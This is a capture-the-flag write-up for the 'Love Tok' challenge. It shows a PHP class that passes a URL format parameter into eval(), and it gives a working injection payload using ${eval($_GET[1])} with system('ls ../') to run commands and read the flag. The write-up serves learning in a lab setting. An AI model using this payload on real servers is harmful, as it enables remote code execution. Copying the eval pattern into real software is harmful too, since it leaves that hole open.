### Love Tok

This challenge uses a similar website to Gunship, however instead of a textbox we are presented with a countdown and a link. Clicking the link will add `format=r` into the url. Lets check the code see if we can exploit this parameter somehow! This lead me to this code:

```php
<?php
class TimeModel
{
    public function __construct($format)
    {
        $this->format = addslashes($format);

        [ $d, $h, $m, $s ] = [ rand(1, 6), rand(1, 23), rand(1, 59), rand(1, 69) ];
        $this->prediction = "+${d} day +${h} hour +${m} minute +${s} second";
    }

    public function getTime()
    {
        //$time = date("'r'", strtotime("'+1 day +1 hour +1 minute 1 second'"));
        eval('$time = date("' . $this->format . '", strtotime("' . $this->prediction . '"));');  //$time variable can be exploited
        return isset($time) ? $test : 'Something went terribly wrong'; // This is directly displayed on the page
    }
}
```

Immediately I saw `addslashes` which when googled lead me to believe this could be exploited somhow. However looking down in the code and I saw it used an `eval`. This is defently it!

Pretty straight forward to find a high likely exploitable mistake. Writing the eval out to a more readable state, we can see it uses this 'r' that we have control over. We can see that the `'r'` is coded inside apostrophies. Reading https://www.programmersought.com/article/30723400042/ lead me to believe this could be exploited since anything inside apostrophies bypasses the addslashes and will execute. 

I don't fully understand why this works but the payload given in that blog works for this challenge: `?format=${eval($_GET[1])}&1=system('ls%20../');` Since the 1 is predefined, the `addslashes` doesn't escape the variable. So when we override the value of `1`, it bypasses the filter!

Adding this to the url gives us a list of files in the directory above. Letting us cat the flag!

Great challenge :)